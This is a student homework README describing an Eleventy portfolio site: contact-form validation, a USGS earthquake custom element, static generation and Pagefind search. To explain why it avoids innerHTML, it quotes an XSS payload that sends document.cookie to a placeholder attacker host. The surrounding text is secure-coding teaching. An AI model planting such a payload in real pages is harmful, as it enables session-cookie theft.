# CSE 134B — HW5

Portfolio site, evolved from the hand-maintained HW2 pages into an Eleventy build
that Netlify generates from source on every push.

Three things ship at one URL:

| Part | What |
| --- | --- |
| 1 | Progressive enhancement — **Option B**, contact-form validation and error reporting |
| 2 | `<quake-feed>`, a custom element backed by the USGS earthquake feed |
| 3 | Eleventy static site generation, deployed from source |
| Extra credit | Pagefind full-text search |

**Deployed site:** <https://prismatic-brioche-89657d.netlify.app>
(also in `deployed-url.json`). Netlify builds it from this repository on every
push to `main`.

---

## Local setup

```bash
npm install     # Eleventy 3 and Pagefind; no runtime dependencies
npm run dev     # local dev server with hot reload, at http://localhost:8080
npm run build   # production build: Eleventy into _site/, then Pagefind indexes it
npm run clean   # remove _site/
```

`npm install && npm run build` on a clean checkout produces the complete site in
`_site/`. That directory is gitignored — the host builds it, nobody uploads it.

One caveat while developing: `npm run dev` runs Eleventy only, so `/pagefind/`
does not exist and the search page will say the index is unavailable. Run
`npm run build` and serve `_site/` to exercise search locally.

---

## Part 1 — Progressive enhancement (Option B: form validation)

### The no-JavaScript baseline

The contact form at `/contact/` validates entirely through native constraint
validation. With JavaScript disabled it is fully usable: the browser blocks
submission, reports each problem itself, and the stylesheet colours the fields.

| Field | Constraints |
| --- | --- |
| `name` | `required` `minlength="2"` `maxlength="60"` `pattern="[\p{L}\p{M}'. -]+"` `title` |
| `email` | `type="email"` `required` `maxlength="254"` `title` |
| `subject` | `required` `minlength="3"` `maxlength="100"` `title` |
| `message` | `required` `minlength="20"` `maxlength="1000"` `title` |

Baseline feedback is CSS only — no scripting in this layer:

```css
:is(input, textarea):user-invalid { border-color: var(--color-danger); }
:is(input, textarea):user-valid   { border-color: var(--color-success); }
```

`:user-invalid` rather than `:invalid` on purpose: it only matches after the
reader has actually interacted with a field, so an untouched empty form is not
a wall of red.

### What the enhancement adds

`src/js/form-validation.js`, an external ES module loaded with
`<script type="module">`. No inline handlers, no libraries, no polyfills.

- Reads each control's `validity` object and writes a specific message into the
  `<output>` associated with that field. `valueMissing`, `typeMismatch`,
  `patternMismatch`, `tooShort`, and `tooLong` each get their own wording;
  anything else falls back to `control.validationMessage`.
- Each `<output>` is referenced from its control's `aria-describedby` and carries
  `aria-live="polite"`, so a change is announced without stealing focus.
- On a failed submission a summary reports how many fields need attention and
  focus moves to the first one, in tree order.
- Validation also runs on `blur`, so a problem surfaces when the reader leaves a
  field rather than only when they press Send. Blur checks deliberately do not
  move focus — that would trap the reader in one field.
- Every error encountered is appended to an array and serialized into a hidden
  `name="form-errors"` input, which submits with the message:

```json
[
  {
    "field": "email",
    "type": "typeMismatch",
    "message": "Enter an email address in the form name@example.com.",
    "timestamp": "2026-08-03T02:21:16.003Z"
  }
]
```

With JavaScript off, that field submits as `[]`.

### One deliberate deviation

`novalidate` is never set — native validation stays fully in force. The script
does call `preventDefault()` on the `invalid` event. That suppresses only the
browser's own error bubble, which would otherwise say "Please fill out this
field" on top of the more specific message already sitting in the `<output>`.
The constraint itself is untouched: the form still refuses to submit.

Because cancelling every `invalid` event also cancels the browser's own
"focus the first invalid control" behaviour, the script takes that over. All the
`invalid` events for one submission attempt fire inside a single task, so the
handler batches them and flushes once from a `setTimeout(…, 0)` rather than
reacting to each one.

### Where it posts

The deployed form posts to Netlify Forms (`data-netlify="true"`, with a honeypot
field), so `form-errors` genuinely reaches a destination and successful
submissions redirect to `/contact/success/`. Running locally the constraints
still work; the submission just has nowhere to go.

---

## Part 2 — `<quake-feed>`

A custom element that fetches recent earthquakes from the U.S. Geological Survey
and renders them as a list. Live on the home page, and again on
`/experiments/` with different attributes.

### Reference

**Tag name:** `quake-feed`

| Attribute | Default | Accepted values | Effect |
| --- | --- | --- | --- |
| `magnitude` | `2.5` | `all`, `1.0`, `2.5`, `4.5`, `significant` | Minimum magnitude band requested from the feed |
| `period` | `day` | `hour`, `day`, `week` | How far back the feed reaches |
| `count` | `5` | integer `1`–`20` | How many quakes to render |

All three are declared in `observedAttributes`, so changing any of them in
DevTools refetches and visibly re-renders. Unrecognised values fall back to the
default instead of throwing — `magnitude="bogus"` renders the 2.5 feed.

**Endpoint:**

```
https://earthquake.usgs.gov/earthquakes/feed/v1.0/summary/{magnitude}_{period}.geojson
```

Keyless, public domain, and it sends `access-control-allow-origin: *`. There is
no credential anywhere in the client code because the API does not have one —
nothing to leak, and no proxy needed.

**Usage:**

```html
<script type="module" src="/js/quake-feed.js"></script>

<quake-feed magnitude="4.5" period="week" count="10">
  <p>Recent earthquake data is loaded from the U.S. Geological Survey and needs
    JavaScript to display. The same feed is browsable at
    <a href="https://earthquake.usgs.gov/earthquakes/map/">earthquake.usgs.gov</a>.</p>
</quake-feed>
```

Whatever sits between the tags is the fallback. The element uses the light DOM,
so that content renders normally until the element upgrades and replaces it —
if the script is blocked, fails to parse, or never arrives, the reader gets a
real sentence and a working link rather than an empty box.

### States

The element reflects its lifecycle to `data-state`, and the stylesheet owns every
visual difference. The script never sets an inline style.

| `data-state` | When |
| --- | --- |
| `idle` | Shell built, no request started yet |
| `loading` | Request in flight — animated indicator, `aria-busy="true"` |
| `ready` | Results rendered as an ordered list |
| `empty` | Request succeeded but the feed had no quakes for that query |
| `error` | Request failed or timed out — message plus a **Try again** button |

`.quake-status` has `role="status"`, so each transition is announced politely.

### Lifecycle and teardown

- `connectedCallback` builds the shell on first connect, wires the retry button,
  and starts the request.
- `disconnectedCallback` aborts the in-flight request through an
  `AbortController` and removes DOM listeners through a second one.
- `attributeChangedCallback` cancels any pending request and reloads. It exits
  early during upgrade, when it fires before `connectedCallback`, so a page load
  makes exactly one request.
- An 8-second timeout aborts the request so a hanging network cannot leave the
  widget spinning. A timeout is distinguished from a disconnect: only the former
  shows an error.

### Rendering safely — why not `innerHTML`

Every list item is cloned from a `<template>` and filled with `textContent` and
`setAttribute`. Nothing that came back over the network is ever concatenated
into an HTML string.

The risk is concrete. USGS `place` values are free text. If the render path were:

```js
list.innerHTML += `<li>${quake.properties.place}</li>`;   // never do this
```

then a `place` of `<img src=x onerror="fetch('https://evil.example/'+document.cookie)">`
would be parsed as markup and run in the page's origin. Through `textContent` the
exact same string is inert — it renders as visible characters.

The two `<template>` elements in the module are the only things assigned via
`innerHTML`, and both are static markup written by hand with no interpolation.

Event URLs get one extra check: an `href` is only installed if the URL starts
with `https://earthquake.usgs.gov/`. Without that, a corrupted feed handing back
a `javascript:` URL would become a live link. When the check fails the anchor is
replaced with plain text.

### Caching and rate limits

Successful responses go into `sessionStorage` under the feed URL with a
five-minute TTL, so reloading during development does not hammer a free public
service. Storage access is wrapped — private browsing, disabled storage, and
quota errors all degrade to "no cache" rather than breaking the widget.

Attribution to the USGS appears in the widget, as their terms request.

---

## Part 3 — Static site generation

**Eleventy 3.1.6**, configured in `eleventy.config.js`. Source in `src/`, output
to `_site/`.

### Structure

```
src/
  _data/site.js              global data: title, author, nav, social links, year
  _includes/
    layouts/base.njk         the document shell — doctype, head, skip link, wrapper
    layouts/page.njk         thin wrapper over base
    layouts/project.njk      the single template behind every case study
    partials/head.njk        title, description, canonical, stylesheet, scripts
    partials/site-header.njk logo, primary navigation
    partials/site-footer.njk copyright and footer navigation
  projects/                  the collection's source of truth
    trailmate.md
    pixelsort-visualizer.md
    studygroup-finder.md
    projects.11tydata.json   layout, tag, and permalink for the whole directory
  css/styles.css
  js/form-validation.js  js/quake-feed.js  js/site-search.js
  assets/
  index.njk about.njk projects.njk experience.njk contact.njk experiments.njk
  search.njk all.njk 404.njk sitemap.njk contact-success.njk
```

### Base layout and shared includes

`layouts/base.njk` owns `<!DOCTYPE>`, `<html>`, the head, the skip link, and the
page wrapper. Three includes are reused on every page — the head/metadata
partial, the site header with navigation, and the site footer. The footer markup
now exists in exactly one file; before conversion it was pasted into all nine.

### Global data

`src/_data/site.js` defines the site title, author, email, canonical URL,
navigation items, and social links once. It is a `.js` data file rather than JSON
so the copyright year is computed at build time and never goes stale. No template
hard-codes any of these values.

### The data-driven collection

Each case study is a Markdown file in `src/projects/` with front matter for
title, description, summary, stack, image, and repository. `projects.11tydata.json`
applies the layout, tag, and permalink pattern to the whole directory, and a
sorted `projects` collection is declared in `eleventy.config.js`.

Three pages come out of one template. Adding a fourth project means adding one
Markdown file — the case-study page, the projects index, the home page grid,
`sitemap.xml`, and `/all/` all update without a template edit, because they all
read the same collection.

### Build-time navigation state

`partials/site-header.njk` compares `page.url` against each entry in `site.nav`:

- exact match → `aria-current="page"`
- section ancestor, e.g. Projects while viewing a case study → `aria-current="true"`

Nothing about this runs in the browser. `aria-current="page"` is reserved for the
page you are actually on; a case study is inside the Projects section but is not
the Projects page, which is what `true` means.

### Generated 404 and sitemap

`src/404.njk` builds to `/404.html`, which Netlify serves automatically on a miss.
`src/sitemap.njk` builds to `/sitemap.xml` from `collections.all`, so every page
is listed with its `lastmod` and the sitemap, the 404 page, and the form success
page exclude themselves.

Per-page `<title>` and `<meta name="description">` come from front matter through
the head partial.

### Deployment

`netlify.toml` is committed with the build command, publish directory, and Node
version declared, so nothing depends on settings typed into a dashboard:

```toml
[build]
  command = "npm run build"
  publish = "_site"
```

`.gitignore` excludes `_site/`, `node_modules/`, and `.env*`. Only source is
committed; a push to GitHub triggers the build on Netlify.

---

## Extra credit — Pagefind

Wired into the build script so the deployed site indexes itself on every deploy:

```json
"build": "eleventy && pagefind --site _site"
```

Nothing is hand-run and no index is committed.

**What gets built.** Pagefind runs *after* Eleventy, over the generated HTML
rather than the source. It reads each page, takes the content inside
`data-pagefind-body`, and writes a static index into `_site/pagefind/`: a small
top-level metadata file, index chunks grouped by term, and one compressed content
fragment per page, plus a WebAssembly search engine and the JS API module.

**Roughly how large.** On this site, 9 indexed pages and about 530 words produce
an 8 KB index directory and 36 KB of page fragments. With the 72 KB WASM engine
and the 48 KB API module, a reader who actually searches downloads roughly 165 KB
— and a reader who never visits `/search/` downloads none of it. The bundled
Pagefind UI is also emitted but this site does not load it.

**Why it needs no search server.** The index is just static files. The API asks
for the metadata file, works out which index chunks a query touches, and requests
only those, then fetches the content fragments for the pages that actually match.
Matching runs in WebAssembly in the browser. Because a query never grows past a
handful of small range requests, a CDN serving static files is the entire
backend — there is nothing to run, scale, or keep online, and no query ever
leaves the reader's machine.

**Scoping.** `<main>` carries `data-pagefind-body`; the header and footer carry
`data-pagefind-ignore`. Without that, every page would match "GitHub" through its
footer. The search page itself, `/all/`, the 404 page, and the form success page
opt out via a `pagefind: false` front matter flag the base layout understands.

**The interface.** `/search/` uses the Pagefind JavaScript API directly rather
than the bundled UI, so it matches the site's design. It is a real `<form>` with
a labelled `<input type="search">`, fully keyboard operable, with results
announced through a `role="status"` region. Queries are debounced, and
`/search/?q=canvas` runs on load so a search is linkable. Excerpts arrive from
Pagefind as HTML strings containing `<mark>`; rather than assigning them to
`innerHTML`, the script splits them and rebuilds real text nodes and `<mark>`
elements.

Search needs JavaScript, and the page says so: a `<noscript>` block explains the
requirement and links `/all/`, a browsable listing of every page built from the
same collection as the sitemap.

---

## Reflection

**What the conversion removed.** Nine copies of the same document shell. Every
HW2 page carried its own doctype, head, header, navigation list, and footer, and
the navigation appeared nine times with `aria-current` moved by hand — the kind
of duplication where a typo in one copy is invisible until someone lands on that
one page. Adding a nav item used to mean nine edits; it is now one line in
`site.js`. The three case studies were three near-identical files that are now
three Markdown files and one template, and the projects index no longer restates
what those pages already say.

**What it cost.** A build step and a `node_modules/` directory, where before the
files on disk were the site. You can no longer open a source file in a browser
and see the page — the source is templates, and the thing you look at is
generated. Debugging gains a layer: a stray character in a partial breaks eleven
pages at once, which is exactly why the deployed markup got validated rather than
trusted. And the tool has to be learned; Eleventy's data cascade is small but it
is still a thing to know that plain HTML did not require.

**What I would not use an SSG for.** Anything whose content is per-request. A
dashboard showing the reader's own data, a page whose content depends on who is
logged in, or a view that must reflect a database as of this second all fight the
model, because the whole premise is that the HTML is decided at build time and
shared by everyone. The earthquake widget on the home page is the honest line:
that content genuinely changes minute to minute, so it is fetched in the browser
rather than baked in — but that also means it is the one part of the site that
stops working when JavaScript does, which is why it ships with fallback content
and everything else does not need any.

---

## Carry-forward notes

- **Validation.** All thirteen *deployed* pages were checked against the Nu HTML
  Checker by URL with zero errors and zero warnings, including all three pages
  generated from the collection template. `styles.css` returns zero errors from
  the W3C CSS validator (only the standard "CSS variables are not statically
  checked" notices).
- **CSS.** HW2 shipped no real stylesheet — three lines of debug borders — so the
  responsive CSS here is authored fresh: custom-property tokens, `color-scheme`
  with a `prefers-color-scheme` override, `clamp()` fluid type, relative units
  throughout, and `auto-fit` grids that reflow without breakpoints. Selectors
  stay on elements and attributes rather than stacked classes.
- **No frameworks.** No CSS framework, no JavaScript framework, no utility
  library, no polyfills. Pagefind is the one dependency shipped to the browser,
  as the assignment permits, and only on the search page.
- **Three HW2 defects were repaired rather than carried forward:** a case study
  loaded an image path that did not exist; the hero's "View Projects" and
  "Résumé" controls were `<button>` elements wired to nothing and are now links;
  and a dead third-party analytics script, an unresolvable demo `<iframe>`, and
  an inline canvas script were removed, leaving Parts 1 and 2 as the only
  JavaScript shipped to the browser.
